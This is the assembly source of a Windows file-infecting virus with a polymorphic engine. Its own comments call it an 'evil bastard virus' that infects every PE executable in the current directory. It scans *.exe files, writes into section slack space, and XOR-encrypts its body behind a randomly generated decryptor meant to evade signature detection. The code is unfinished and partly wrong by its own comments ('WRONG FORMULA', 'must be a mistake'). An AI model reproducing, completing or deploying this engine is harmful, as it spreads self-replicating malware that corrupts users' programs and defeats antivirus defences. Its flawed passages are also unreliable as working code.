; _________________________________________________________________________
; 
; Rosetta.asm: Polymorphic Engine
; _________________________________________________________________________

    .386
    .model  flat, stdcall

; _________________________________________________________________________

    include c:\masm32\include\windows.inc
    include c:\masm32\include\user32.inc
    include c:\masm32\include\kernel32.inc

    includelib c:\masm32\lib\user32.lib
    includelib c:\masm32\lib\kernel32.lib

; _________________________________________________________________________

    .data

szCwd           db                  "*.exe", 0

szBuff          db                  1024 dup(90h)

ffd             WIN32_FIND_DATA     <>

; _________________________________________________________________________

dwSeed      equ     00h
dwKey       equ     04h
dwRegKey    equ     08h
dwRegOff    equ     0Ch
dwRegSize   equ     10h
dwOffset    equ     14h
dwEP        equ     18h

hFind           equ     1Ch
hFile           equ     20h
hFileMapping    equ     24h
hFileView       equ     28h

pDosHeader      equ     2Ch

dwStackSize     equ     pDosHeader+04h

; _________________________________________________________________________

_rnd_mov_tbl    dd      mov_reg32_imm32
                dd      push_imm32_pop_reg32

_rnd_xor_tbl    dd      xor_regmem8_reg8
_rnd_inc_tbl    dd      inc_reg32
_rnd_dec_tbl    dd      dec_reg32
_rnd_jnz_tbl    dd      jnz_rel8
_rnd_jmp_tbl    dd      jmp_rel8

; _________________________________________________________________________

    .code

start:

    ; Yet another evil bastard virus.
    ; Nothing special to do here for the first infection.
    ; WARN! The virus will infect all PE files in the current directory.
    
__virus_start:
    push    ebp
    mov     esp, ebp
    
    sub     esp, dwStackSize

    call    GetTickCount
    
    push    eax
    call    __srand

;kernel32_base:
;    mov     eax, fs:[018h]      ; TEB
;    mov     eax, [eax+30h]      ; PEB
;    mov     eax, [eax+0Ch]
;    mov     eax, [eax+1Ch]
;    mov     eax, [eax]
;    mov     eax, [eax+08h]
    
;export_table:
;    mov     ebx, [eax+3Ch]      ; PE Header
;    add     ebx, eax
;    mov     ebx, [ebx+78h]      ; Data Directory
;    add     ebx, eax

;    mov     ecx, [ebx+18h]      ; NumberOfNames
;    mov     edx, [ebx+1Ch]
;    add     edx, eax


    push    offset ffd
    push    offset szCwd
    call    FindFirstFile

    cmp     eax, INVALID_HANDLE_VALUE
    je      noInfection

    mov     [ebp-hFind], eax
 
tryFile:

    push    NULL
    push    FILE_ATTRIBUTE_NORMAL
    push    OPEN_EXISTING
    push    NULL
    push    FILE_SHARE_READ or FILE_SHARE_WRITE
    push    GENERIC_READ or GENERIC_WRITE
    push    offset [ffd.cFileName]
    call    CreateFile

    cmp     eax, INVALID_HANDLE_VALUE
    je      nextFile
    
    mov     [ebp-hFile], eax

    push    NULL
    push    0
    push    0
    push    PAGE_READWRITE
    push    NULL
    push    [ebp-hFile]
    call    CreateFileMapping

    cmp     eax, NULL
    je      closeFile      
    
    mov     [ebp-hFileMapping], eax

    push    0
    push    0
    push    0
    push    FILE_MAP_READ or FILE_MAP_WRITE
    push    [ebp-hFileMapping]
    call    MapViewOfFile

    cmp     eax, NULL
    je      closeFileMapping

    mov     [ebp-hFileView], eax
    
    ; Here the file is open. We have to check
    ; if it's a valid PE file. Then we can try to
    ; infect it. 
    cmp     WORD PTR [eax], IMAGE_DOS_SIGNATURE
    jne     closeViewOfFile

    ; PE Header
    add     eax, [eax+3Ch]
    
    cmp     DWORD PTR [eax], IMAGE_NT_SIGNATURE
    jne     closeViewOfFile

    add     eax, 04h

    ; File Header
    xor     ecx, ecx
    mov     cx, WORD PTR [eax+02h]  ; NumberOfSections

    ; Skip Nt Headers
    add     eax, IMAGE_FILE_HEADER
    add     eax, IMAGE_OPTIONAL_HEADER

trySection:
    mov     ebx, [eax+10h]  ; SizeOfRawData
    sub     ebx, [eax+08h]  ; VirtualSize
    cmp     ebx, __virus_end - __virus_start
    jl      nextSection

    ; WRONG FORMULA !!!
    mov     edx, [ebp-hFileView]
    add     edx, [eax+10h]
    add     edx, [eax+08h]

    push    edx
    push    __virus_end - __virus_start
    push    __virus_start
    
    call    PolyEngine

nextSection:
    add     eax, IMAGE_SECTION_HEADER
    loop    trySection
    
closeViewOfFile:
    push    [ebp-hFileView]
    call    UnmapViewOfFile
    
closeFileMapping:
    push    [ebp-hFileMapping]
    call    CloseHandle

closeFile:
    push    [ebp-hFile]
    call    CloseHandle
    
nextFile:
    push    offset ffd
    push    [ebp-hFind]
    call    FindNextFile

    cmp     eax, 0
    jnz     tryFile
    
noInfection:
    ; We must jump at OEP here
    ; or exit if its the first infection
    
    push    0
    call    ExitProcess
    
; _________________________________________________________________________

_get_a_name:
    
; _________________________________________________________________________

; ebp + 08  = [in] src
; ebp + 0C  = [in] src_len
; ebp + 10  = [in] dst
; ebp + 14  = [out] dst_len (maybe need in future ?)

PolyEngine:

    push    ebp
    mov     ebp, esp

    sub     esp, dwStackSize
    
    ; Generate a key
    call    __rand
    mov     edx, eax
    mov     [ebp-dwKey], al
    
    ; Encrypt virus
    cld
    mov     edi, [ebp+10h] ;offset szBuff
    mov     esi, [ebp+08h] ;__virus_start
    mov     ecx, [ebp+0Ch] ;__virus_end - __virus_start

encrypt:
    lodsb
    xor     al, dl
    stosb
    loop    encrypt
    
    ; Generate decryptor
    mov     [ebp-dwEP], edi

    ; WTF ??? must be a mistake -> mov     esi, offset szBuff
    
    ; Generate random registers
rnd_reg_key:
    mov     eax, 04h
    call    __randm
    mov     [ebp-dwRegKey], al

rnd_reg_size:
    mov     eax, 04h
    call    __randm
    mov     bl, [ebp-dwRegKey]
    cmp     bl, al
    je      rnd_reg_size
    mov     [ebp-dwRegSize], al

rnd_reg_off:
    mov     eax, 04h
    call    __randm
    mov     bl, [ebp-dwRegKey]
    cmp     bl, al
    je      rnd_reg_off
    mov     bl, [ebp-dwRegKey]
    cmp     bl, al
    je      rnd_reg_off
    mov     [ebp-dwRegOff], al
    
    ; mov e?x, size
rnd_mov_rnd_size:
    push    __virus_end - __virus_start
    xor     ebx, ebx
    mov     bl, [ebp-dwRegSize]
    push    ebx
      
    call    _rnd_mov_reg32_imm32

    ; mov e?x, off szBuff    
rnd_mov_rnd_off:
    push    offset szBuff
    xor     ebx, ebx
    mov     bl, [ebp-dwRegOff]
    push    ebx

    call    _rnd_mov_reg32_imm32
    
    ; mov e?x, key
rnd_mov_rnd_key:
    xor     ebx, ebx
    mov     bl, [ebp-dwKey]
    push    ebx
    
    xor     ebx, ebx
    mov     bl, [ebp-dwRegKey]
    push    ebx

    call    _rnd_mov_reg32_imm32

    ; save current offset for later use
    mov     [ebp-dwOffset], edi

    ; xor byte ptr [e?x], al
rnd_xor_key_off:
    xor     ebx, ebx
    mov     bl, [ebp-dwRegKey]
    push    ebx

    xor     ebx, ebx
    mov     bl, [ebp-dwRegOff]
    push    ebx

    call    _rnd_xor_reg8_imm8

    ; inc e?x
rnd_inc_offset:
    xor     ebx, ebx
    mov     bl, [ebp-dwRegOff]
    push    ebx

    call    _rnd_inc_reg32
    
    ; dec e?x
rnd_dec_size:
    xor     ebx, ebx
    mov     bl, [ebp-dwRegSize]
    push    ebx

    call    _rnd_dec_reg32

    ; jnz loop
rnd_jnz_loop:
    mov     ebx, edi
    mov     edx, [ebp-dwOffset]
    sub     edx, ebx
    push    edx
    
    call    _rnd_jnz_rel8

    ; jmp 3v1l
rnd_jmp_virus:
    mov     ebx, offset szBuff
    mov     edx, edi

    sub     ebx, edx
    push    ebx
    
    call    _rnd_jmp_rel8

    ; TEST
    mov     eax, [ebp-dwEP]
    jmp     eax
       
    leave
    ret
; _________________________________________________________________________

_rnd_mov_reg32_imm32:
    mov     eax, 01h
    call    __randm

    mov     ebx, [esp+4] 
    mov     edx, [esp+8]
    
    push    edx
    push    ebx

    mov     ecx, offset _rnd_mov_tbl
    call    [4*eax+ecx]

    add     esp, 8
    ret

_rnd_xor_reg8_imm8:
    xor     eax, eax
    ;mov     eax, 01h
    ;call    __randm

    mov     ebx, [esp+4]
    mov     edx, [esp+8]

    push    edx
    push    ebx
    
    mov     ecx, offset _rnd_xor_tbl
    call    [4*eax+ecx]

    add     esp, 8
    ret

_rnd_inc_reg32:
    xor     eax, eax
    ;mov     eax, 01h
    ;call    __randm

    mov     ebx, [esp+4]
    push    ebx
    
    mov     ecx, offset _rnd_inc_tbl
    call    [4*eax+ecx]

    add     esp, 4
    ret

_rnd_dec_reg32:
    xor     eax, eax
    ;mov     eax, 01h
    ;call    __randm

    mov     ebx, [esp+4]
    push    ebx
    
    mov     ecx, offset _rnd_dec_tbl
    call    [4*eax+ecx]

    add     esp, 4
    ret

_rnd_jnz_rel8:
    xor     eax, eax
    ;mov     eax, 01h
    ;call    __randm

    mov     ebx, [esp+4]
    push    ebx
    
    mov     ecx, offset _rnd_jnz_tbl
    call    [4*eax+ecx]

    add     esp, 4
    ret    

_rnd_jmp_rel8:
    xor     eax, eax
    ;mov     eax, 01h
    ;call    __randm

    mov     ebx, [esp+4]
    push    ebx
    
    mov     ecx, offset _rnd_jmp_tbl
    call    [4*eax+ecx]

    add     esp, 4
    ret    

; _________________________________________________________________________

mov_reg32_imm32:
    mov     eax, [esp+4]
    add     al, 0B8h
    stosb
    mov     eax, [esp+8]
    stosd
    ret

push_imm32_pop_reg32:
    ; push
    mov     al, 68h
    stosb
    mov     eax, [esp+8]
    stosd
    ; pop
    mov     al, [esp+4]
    add     al, 58h
    stosb
    ret
; _________________________________________________________________________

xor_regmem8_reg8:
    mov     al, 30h
    stosb
    mov     eax, [esp+8]
    shl     eax, 3
    or      eax, [esp+4]
    stosb
    ret
; _________________________________________________________________________

inc_reg32:
    mov     eax, [esp+4]
    add     al, 40h
    stosb
    ret
; _________________________________________________________________________
    
dec_reg32:
    mov     eax, [esp+4]
    add     al, 48h
    stosb
    ret
; _________________________________________________________________________

jnz_rel8:
    mov     al, 75h
    stosb
    mov     eax, [esp+4]
    sub     eax, 2
    stosb
    ret
; _________________________________________________________________________

jmp_rel8:
    mov     al, 0EBh
    stosb
    mov     eax, [esp+4]
    sub     eax, 2
    stosb
    ret
; _________________________________________________________________________

junk:
    ret
        
; _________________________________________________________________________

__srand:
    mov     [ebp-dwSeed], eax
    ret
    
; _________________________________________________________________________

; msvcrt.dll random algorithm (77C071D3h)

__rand:
    mov     ecx, [ebp-dwSeed]
    imul    ecx, ecx, 343FDh
    add     ecx, 269EC3h
    mov     [ebp-dwSeed], ecx
    mov     eax, ecx
    shr     eax, 16
    and     eax, 7FFFh
    ret

; _________________________________________________________________________

__randm:
    mov     ebx, eax
    call    __rand
    xor     edx, edx
    idiv    ebx
    mov     eax, edx
    ret
    
; _________________________________________________________________________


__virus_end:

; _________________________________________________________________________

end start